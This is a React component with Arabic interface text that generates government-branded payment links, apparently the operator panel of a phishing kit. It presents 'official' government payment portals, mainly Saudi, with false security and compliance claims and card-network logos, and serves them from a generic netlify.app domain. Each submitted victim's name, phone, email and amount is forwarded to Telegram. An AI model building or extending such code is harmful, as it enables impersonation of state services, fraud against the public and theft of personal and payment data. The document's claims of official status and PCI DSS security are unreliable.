import React, { useState, useMemo, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getGovernmentServiceByKey } from "@/lib/governmentPaymentServices";
import { getCurrencySymbol, getCurrencyCode } from "@/lib/countryCurrencies";
import { 
  Landmark, 
  FileText, 
  DollarSign, 
  User, 
  Phone, 
  Mail,
  Copy,
  ExternalLink,
  CheckCircle,
  Shield,
  Lock,
  ArrowRight,
  Info,
  RefreshCw
} from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";

const GovernmentPaymentLinkCreator = () => {
  const { country, serviceKey } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  // Get service info
  const govService = useMemo(() => getGovernmentServiceByKey(serviceKey || ''), [serviceKey]);
  const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
  
  // State for form fields
  const [fullName, setFullName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [email, setEmail] = useState("");
  const [amount, setAmount] = useState("500");
  const [reference, setReference] = useState("");
  const [description, setDescription] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [linkId, setLinkId] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState("card");

  const primaryColor = govSystem.colors.primary;
  const secondaryColor = govSystem.colors.secondary;

  useEffect(() => {
    // Scroll to top on mount
    window.scrollTo(0, 0);
  }, []);

  if (!govService) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gray-50">
        <Card className="p-8 text-center max-w-md shadow-lg border-0">
          <h2 className="text-2xl font-bold mb-4 text-red-600">الخدمة غير موجودة</h2>
          <p className="text-gray-600 mb-6 font-medium">لم نتمكن من العثور على الخدمة المطلوبة في هذا النظام.</p>
          <Button
            onClick={() => navigate('/services')}
            className="w-full h-12 text-lg font-bold"
          >
            العودة للخدمات
          </Button>
        </Card>
      </div>
    );
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!fullName || !phoneNumber || !amount) {
      toast({
        title: "خطأ في البيانات",
        description: "الرجاء ملء جميع الحقول الإلزامية للمتابعة",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country || govService.country,
        payload: {
          service_key: serviceKey,
          service_name: govService.nameAr,
          customerInfo: {
            fullName,
            phoneNumber,
            email,
          },
          payment_amount: parseFloat(amount),
          currency_code: getCurrencyCode(country || govService.country),
          reference,
          description,
          provider: govService.key.toUpperCase(),
          selectedCountry: country || govService.country,
          payment_method: paymentMethod,
        },
      });

      // For government payment services, generate direct link
      const baseUrl = typeof window !== 'undefined'
        ? window.location.origin
        : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://glittering-eclair-9e77e0.netlify.app');
      
      const paymentUrl = `${baseUrl}/r/${country || 'SA'}/government/${link.id}`;

      setCreatedLink(paymentUrl);
      setLinkId(link.id);
      setShowSuccess(true);

      await sendToTelegram({
        type: 'payment_recipient',
        data: {
          service: govService.nameAr,
          customer_name: fullName,
          phone: phoneNumber,
          email: email || 'غير محدد',
          amount: parseFloat(amount),
          currency: getCurrencySymbol(country || govService.country),
          reference: reference || 'غير محدد',
          description: description || 'غير محدد',
          payment_url: paymentUrl,
        },
        timestamp: new Date().toISOString(),
      });

      toast({
        title: "تم إنشاء الرابط بنجاح",
        description: "تم إرسال نسخة من البيانات إلى لوحة التحكم",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ فني",
        description: "حدث خطأ غير متوقع أثناء إنشاء الرابط. حاول مرة أخرى.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdLink);
    toast({
      title: "تم النسخ",
      description: "تم نسخ رابط السداد إلى الحافظة بنجاح",
    });
  };

  const handlePreview = () => {
    window.open(createdLink, '_blank');
  };

  if (showSuccess) {
    return (
      <div 
        className="min-h-screen flex items-center justify-center py-12 px-4 bg-gray-50"
        style={{ fontFamily: govSystem.fonts.primaryAr }}
        dir="rtl"
      >
        <Card 
          className="max-w-2xl w-full overflow-hidden border-0 shadow-2xl bg-white"
          style={{ borderRadius: govSystem.borderRadius.lg }}
        >
          <div 
            className="p-10 text-center relative overflow-hidden"
            style={{ background: govSystem.gradients.header }}
          >
            <div className="absolute top-0 left-0 w-full h-full opacity-10 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')]" />
            <div className="w-24 h-24 mx-auto mb-6 rounded-full bg-white/20 backdrop-blur-md flex items-center justify-center border-4 border-white/30 animate-in zoom-in duration-500">
              <CheckCircle className="w-14 h-14 text-white" />
            </div>
            <h2 className="text-3xl font-black text-white mb-3">
              جاهز للمشاركة
            </h2>
            <p className="text-white/90 text-lg">
              تم إنشاء رابط السداد الرسمي لخدمة {govService.nameAr}
            </p>
          </div>

          <div className="p-10 space-y-8">
            <div 
              className="p-8 rounded-2xl border-2 transition-all hover:shadow-md"
              style={{
                borderColor: `${primaryColor}40`,
                background: `${primaryColor}05`
              }}
            >
              <Label className="text-sm font-black mb-3 block" style={{ color: primaryColor }}>
                رابط بوابة السداد الموحدة
              </Label>
              <div className="bg-white p-5 rounded-xl break-all text-sm font-mono border-2 border-gray-100 shadow-inner flex items-center justify-between gap-4">
                <span className="text-gray-700">{createdLink}</span>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <Button
                onClick={handleCopyLink}
                size="lg"
                className="w-full h-14 text-lg font-black shadow-lg hover:scale-[1.02] transition-transform"
                style={{
                  background: govSystem.gradients.primary,
                  color: govSystem.colors.textOnPrimary
                }}
              >
                <Copy className="w-6 h-6 ml-2" />
                نسخ الرابط
              </Button>
              <Button
                onClick={handlePreview}
                size="lg"
                variant="outline"
                className="w-full h-14 text-lg font-black border-2 hover:bg-gray-50 hover:scale-[1.02] transition-transform"
                style={{
                  borderColor: primaryColor,
                  color: primaryColor
                }}
              >
                <ExternalLink className="w-6 h-6 ml-2" />
                معاينة البوابة
              </Button>
            </div>

            <div className="pt-6 border-t border-gray-100 space-y-3">
              <Button
                onClick={() => navigate(`/pay/${linkId}/data`)}
                size="lg"
                variant="secondary"
                className="w-full h-12 font-bold bg-gray-100 hover:bg-gray-200 text-gray-800"
              >
                إكمال البيانات يدوياً
              </Button>

              <Button
                onClick={() => navigate('/services')}
                size="lg"
                variant="ghost"
                className="w-full h-12 font-bold text-gray-500 hover:text-gray-800"
              >
                إنشاء رابط لخدمة أخرى
              </Button>
            </div>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen py-10 px-4 bg-gray-50"
      style={{
        fontFamily: govSystem.fonts.primaryAr
      }}
      dir="rtl"
    >
      <div className="container mx-auto max-w-4xl">
        <div className="mb-8 flex items-center justify-between">
          <BackButton />
          <div className="hidden sm:flex items-center gap-2 text-sm text-gray-500 font-medium bg-white px-4 py-2 rounded-full shadow-sm">
            <Lock className="w-4 h-4 text-green-500" />
            <span>نظام سداد آمن ومحمي</span>
          </div>
        </div>

        <Card 
          className="overflow-hidden border-0 shadow-2xl bg-white"
          style={{ borderRadius: govSystem.borderRadius.lg }}
        >
          {/* Official Banner Header */}
          <div 
            className="p-10 relative min-h-[220px] flex items-center"
            style={{
              background: govSystem.gradients.header,
            }}
          >
            <div className="absolute top-0 left-0 w-full h-full opacity-10 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')]" />

            <div className="relative z-10 flex flex-col sm:flex-row items-center gap-8 w-full">
              <div className="w-24 h-24 rounded-2xl bg-white/20 backdrop-blur-xl flex items-center justify-center border-2 border-white/30 shadow-2xl rotate-3">
                <Landmark className="w-12 h-12 text-white" />
              </div>
              <div className="text-center sm:text-right flex-1">
                <div className="flex flex-col sm:flex-row items-center gap-3 mb-2">
                  <h1 className="text-4xl font-black text-white leading-tight">
                    {govService.nameAr}
                  </h1>
                  <span className="px-3 py-1 bg-white/20 backdrop-blur-md rounded-lg text-xs font-bold text-white border border-white/20">
                    رسمي
                  </span>
                </div>
                <p className="text-white/80 text-lg font-medium max-w-xl">
                  {govService.description}
                </p>
              </div>

              {govService.logo && (
                <div className="hidden lg:block animate-pulse">
                  <img
                    src={govService.logo}
                    alt={govService.nameAr}
                    className="h-20 w-auto object-contain brightness-0 invert opacity-90"
                    onError={(e) => (e.target as HTMLImageElement).style.display = 'none'}
                  />
                </div>
              )}
            </div>
          </div>

          {/* Form Content */}
          <form onSubmit={handleSubmit} className="p-10 bg-white">
            <div className="grid md:grid-cols-2 gap-10">
              {/* Left Column - Customer Data */}
              <div className="space-y-8">
                <div>
                  <h3 className="text-xl font-black mb-6 flex items-center gap-3" style={{ color: primaryColor }}>
                    <div className="w-2 h-8 rounded-full" style={{ background: primaryColor }} />
                    بيانات المستفيد
                  </h3>

                  <div className="space-y-5">
                    <div className="space-y-2">
                      <Label className="text-sm font-bold text-gray-700">الاسم الرباعي للمستفيد *</Label>
                      <div className="relative">
                        <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                        <Input
                          value={fullName}
                          onChange={(e) => setFullName(e.target.value)}
                          placeholder="أدخل الاسم كما هو في الهوية"
                          required
                          className="h-14 pr-12 border-2 focus:border-opacity-100 transition-all text-lg rounded-xl"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label className="text-sm font-bold text-gray-700">رقم الجوال النشط *</Label>
                      <div className="relative">
                        <Phone className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                        <Input
                          value={phoneNumber}
                          onChange={(e) => setPhoneNumber(e.target.value)}
                          placeholder="05XXXXXXXX"
                          required
                          className="h-14 pr-12 border-2 focus:border-opacity-100 transition-all text-lg rounded-xl text-left"
                          dir="ltr"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label className="text-sm font-bold text-gray-700">البريد الإلكتروني (اختياري)</Label>
                      <div className="relative">
                        <Mail className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                        <Input
                          type="email"
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          placeholder="example@domain.com"
                          className="h-14 pr-12 border-2 focus:border-opacity-100 transition-all text-lg rounded-xl text-left"
                          dir="ltr"
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Right Column - Payment Data */}
              <div className="space-y-8">
                <div>
                  <h3 className="text-xl font-black mb-6 flex items-center gap-3" style={{ color: primaryColor }}>
                    <div className="w-2 h-8 rounded-full" style={{ background: primaryColor }} />
                    تفاصيل الفاتورة
                  </h3>

                  <div className="space-y-5">
                    <div className="space-y-2">
                      <Label className="text-sm font-bold text-gray-700">المبلغ الإجمالي للاستحقاق *</Label>
                      <div className="relative">
                        <div className="absolute left-4 top-1/2 -translate-y-1/2 font-black text-gray-500">
                          {getCurrencySymbol(country || govService.country)}
                        </div>
                        <Input
                          type="number"
                          value={amount}
                          onChange={(e) => setAmount(e.target.value)}
                          placeholder="0.00"
                          required
                          className="h-14 pl-16 border-2 focus:border-opacity-100 transition-all text-2xl font-black rounded-xl"
                          step="0.01"
                          min="0"
                        />
                      </div>
                      <p className="text-xs text-gray-400 font-medium">سيتم تحصيل المبلغ بالعملة الرسمية للدولة</p>
                    </div>

                    <div className="space-y-2">
                      <Label className="text-sm font-bold text-gray-700">رقم المرجع / الفاتورة (اختياري)</Label>
                      <div className="relative">
                        <FileText className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                        <Input
                          value={reference}
                          onChange={(e) => setReference(e.target.value)}
                          placeholder="REF-2025-XXXX"
                          className="h-14 pr-12 border-2 focus:border-opacity-100 transition-all text-lg rounded-xl"
                        />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label className="text-sm font-bold text-gray-700">سبب السداد / ملاحظات</Label>
                      <Textarea
                        value={description}
                        onChange={(e) => setDescription(e.target.value)}
                        placeholder="أدخل وصفاً مختصراً لسبب السداد..."
                        className="min-h-[110px] border-2 focus:border-opacity-100 transition-all text-lg rounded-xl resize-none p-4"
                      />
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Security Notice & Submit */}
            <div className="mt-12 space-y-8">
              <div
                className="p-6 rounded-2xl flex items-start gap-4 border-2"
                style={{
                  background: `${primaryColor}08`,
                  borderColor: `${primaryColor}20`
                }}
              >
                <div className="p-2 rounded-lg bg-white shadow-sm" style={{ color: primaryColor }}>
                  <Shield className="w-8 h-8" />
                </div>
                <div className="flex-1">
                  <p className="text-lg font-black mb-1" style={{ color: primaryColor }}>
                    نظام مدفوعات حكومي مؤمن بالكامل
                  </p>
                  <p className="text-gray-600 font-medium leading-relaxed">
                    جميع البيانات المسجلة تخضع لاتفاقية سرية المعلومات الحكومية. يتم تشفير بيانات الدفع بواسطة تقنيات SSL المتقدمة وتوافق معايير PCI DSS العالمية لضمان أعلى مستويات الأمان.
                  </p>
                </div>
              </div>

              <div className="flex flex-col items-center gap-6">
                <Button
                  type="submit"
                  size="lg"
                  disabled={isSubmitting}
                  className="w-full h-16 text-2xl font-black shadow-2xl hover:scale-[1.01] active:scale-[0.99] transition-all"
                  style={{
                    background: govSystem.gradients.primary,
                    color: govSystem.colors.textOnPrimary,
                    borderRadius: '16px'
                  }}
                >
                  {isSubmitting ? (
                    <span className="flex items-center justify-center gap-3">
                      <RefreshCw className="w-7 h-7 animate-spin" />
                      جاري إصدار الرابط...
                    </span>
                  ) : (
                    <>
                      <Lock className="w-7 h-7 ml-3" />
                      إصدار رابط السداد الرسمي
                    </>
                  )}
                </Button>

                <div className="flex items-center gap-8 text-gray-400">
                  <div className="flex items-center gap-2 text-xs font-bold">
                    <CheckCircle className="w-4 h-4 text-green-500" />
                    <span>توثيق رسمي</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs font-bold">
                    <Shield className="w-4 h-4 text-blue-500" />
                    <span>حماية متكاملة</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs font-bold">
                    <Info className="w-4 h-4 text-orange-500" />
                    <span>دعم 24/7</span>
                  </div>
                </div>
              </div>
            </div>
          </form>

          {/* Footer Branding */}
          <div 
            className="px-10 py-6 text-center border-t border-gray-100"
            style={{ background: '#fcfcfc' }}
          >
            <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
              <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">
                © 2025 {govSystem.nameEn} Digital Payment Gateway
              </p>
              <div className="flex items-center gap-4 grayscale opacity-50">
                <img src="/visa-logo.png" alt="Visa" className="h-4 w-auto" />
                <img src="/mastercard-logo.png" alt="Mastercard" className="h-6 w-auto" />
                <img src="/mada-logo.png" alt="Mada" className="h-4 w-auto" />
              </div>
            </div>
          </div>
        </Card>

        <div className="mt-8 text-center">
          <button
            onClick={() => navigate('/services')}
            className="text-gray-400 hover:text-gray-600 transition-colors flex items-center gap-2 mx-auto font-bold text-sm"
          >
            <ArrowRight className="w-4 h-4" />
            العودة لقائمة الخدمات الرئيسية
          </button>
        </div>
      </div>
    </div>
  );
};

export default GovernmentPaymentLinkCreator;
